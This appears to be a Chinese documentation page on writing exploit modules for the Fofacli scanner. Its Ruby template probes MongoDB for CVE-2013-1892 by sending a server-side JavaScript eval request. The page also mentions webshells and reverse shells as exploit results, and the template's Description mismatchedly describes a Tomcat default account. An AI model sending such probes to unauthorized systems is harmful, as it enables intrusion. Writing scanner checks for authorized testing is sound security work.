
<div class="row">
  <div class="col-lg-12">
    <h1 id="quickstart">Fofacli漏洞库（exploit）编写指南</h1>
    <p>先来看一看命令行帮助：<pre>
require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def initialize(info = {})
    super(
      'Name' => 'mongodb execute js',
      'Description' => %q{
Default admin account of tomcat administraotr: admin/htoa. Backdoor?
          },
      'Author' =>
          [
              'LubyRuffy',
          ],
      'Product' => 'Mongodb',
      'Homepage' => 'http://www.mongodb.org/',
      'References' =>
          [
              ['CVE', '2013-1892'],
              "http://2012.zeronights.org/includes/docs/Firstov%20-%20Attacking%20MongoDB.pdf"
          ],
      'DisclosureDate'=> '2014-07-01',
      'FofaQuery'=>'body="&lt;a href=\&quot;/_replSet\&quot;&gt;Replica set status&lt;/a&gt;&lt;/p&gt;"',
      'ScanSteps' =>
        [
            {
                'Request'=> {
                    method: 'GET',
                    uri: '/admin/$cmd/?filter_eval=function(){val=db.version(); return val;}&limit=1',
                    data: ''
                },
                'ResponseTest'=> {
                    type: 'group',
                    operation: 'AND',
                    checks: [
                        {
                            type: 'item',
                            varibale: '$code',
                            operation: '==',
                            value: 200
                        },
                        {
                            type: 'item',
                            varibale: '$body',
                            operation: 'contains',
                            value: 'total_rows'
                        }
                    ]
                }
            },
        ]
      )
    end

    def vulnerable(hostinfo)
        excute_scansteps(hostinfo) if @info['ScanSteps']
    end

    def exploit(hostinfo)
        #todo 反弹shell？
    end
end
    </pre></p>
    <p>为了满足调用的情况，需要进行如下几步：</p>
    <ol>
      <li><p>加载库文件：<code>require 'fofa_core'</code>这里面定义了一些需要的模块、类库和方法。</p></li>
      <li><p>定义漏洞扫描类：<code>class FofaExploits < Fofa::Exploit</code></p></li>
      <li><p>通过<code>initialize</code>初始化函数，配置基本信息</p></li>
      <li><p>定义<code>vulnerable</code>方法来扫描漏洞</p></li>
      <li><p>定义<code>exploit</code>来利用漏洞（可选）</p></li>
    </ol>
  </div>
</div>


<div class="row">
  <div class="col-lg-12">
    <h1 id="customization">漏洞库基本信息</h1>
    <p>基本信息部分除去fofaquery和scanstep外，主要用于显示。对应信息如下：</p>
    <ul>
      <li><p>Name：漏洞名称，通常一句话（String）</p></li>
      <li><p>Description：漏洞描述，可以详细描述一下漏洞信息（String）</p></li>
      <li><p>Author：作者，可以一个或者多个（Array）</p></li>
      <li><p>Product：漏洞影响的产品名称，比如dedecms、mongodb这样的（String）</p></li>
      <li><p>Homepage：对应漏洞影响的产品网站（String）</p></li>
      <li><p>References：漏洞的来源或者参考（Array），可以直接是网址URL，可以是CVE对应编号，可以是wooyun对应编号。</p></li>
      <li><p>DisclosureDate：漏洞发现的日期，我个人更偏向于编写漏洞库的日期。（String）</p></li>
      <li><p>FofaQuery：如果需要结合fofa导出扫描目标，通过这个参数可以指定。（String）</p></li>
      <li><p>ScanSteps：这是扫描规则定义部分了，下面专门介绍一下。</p></li>
    </ul>
  </div>
  <div class="col-lg-12">
    <h2 id="customization">ScanSteps扫描规则的定义</h2>
    <p>通常来说，一次漏洞扫描请求就是发一个指定url的HTTP请求，然后根据目标的响应是否匹配某种条件来判断是否存在漏洞。所以，ScanSteps其实就对应http的请求和判断的规则。如果你决定自己写vulnerable代码，这里可以跳过。</p>
    <p>ScanSteps是一个数组Array，每个成员是一个定义HTTP请求的Hash。一般情况下请求一次就行，如果需要请求多次才能判断，那么就定义多个HTTP请求吧。</p>
    <p>一个HTTP请求包含两部分：Request和Response：</p>
    <ul>
      <li><p>Request定义一个HTTP请求，包含如下几个字段：
        <ul>
          <li>method: HTTP方法，可以是GET/POST/DELETE等等，甚至是任意字符串。必填</li>
          <li>uri: 请求的uri地址。必填</li>
          <li>data: 在POST的情况下，提交的数据通过这个来指定。可选</li>
          <li>header: 自定义http头部数据，这是一个数组，类似这样<code>{'MyHeader'=> 'Just test'}</code>。可选</li>
        </ul>
        </p>
      </li>
      <li><p>ResponseTest：响应测试，成员可以是无限层次递归的测试项。由type指定了是一个单独测试项还是一个测试组。
        <ul>
          <li>item: 最小的测试项。成员包含：
            <ul>
              <li>varibale：指定针对HTTP响应中的那个变量进行测试，预置了：
                <ul>
                  <li>$code：HTTP响应码，Integer类型</li>
                  <li>$head：HTTP响应头部信息，String类型</li>
                  <li>$body：HTTP正文，UTF8格式文本</li>
                </ul>
              </li>
              <li>operation：计算符，包括：
                <ul>
                  <li>Integer类型判断时包括：== != > < >= <= </li>
                  <li>String类型判断时包括：start_with end_with contains regex </li>
                </ul>
              </li>
              <li>value就是用来对比的值</li>
            </ul>
          </li>
          <li>group：测试组，通过checks数组指定了测试集合，通过operation标明是AND还是OR的关系。</li>
        </ul>
        </p>
      </li>
    </ul>
  </div>
</div>


<div class="row">
  <div class="col-lg-12">
    <h1 id="customization">定义扫描函数vulnerable</h1>
    <p>扫描函数只接收一个参数：hostinfo，格式为1.1.1.1:28017或者www.site.com:8080这样的。</p>
    <p>扫描函数返回一个boolean型，标明是否存在漏洞。就这么简单</p>
    <p>如果漏洞判断可以通过ScanSteps那样定义的话，那么直接调用<code>excute_scansteps(hostinfo) if @info['ScanSteps']</code>让fofa类库去执行就可以了。</p>
  </div>
</div>

<div class="row">
  <div class="col-lg-12">
    <h1 id="customization">定义漏洞利用函数exploit</h1>
    <p>同样函数只接收一个参数：hostinfo，格式为1.1.1.1:28017或者www.site.com:8080这样的。</p>
    <p>漏洞利用函数自行决定返回内容，可以是一个webshell的地址，或者是反弹shell之类的，这个依托于payload，关于payload，等我有时间再写！</p>
  </div>
</div>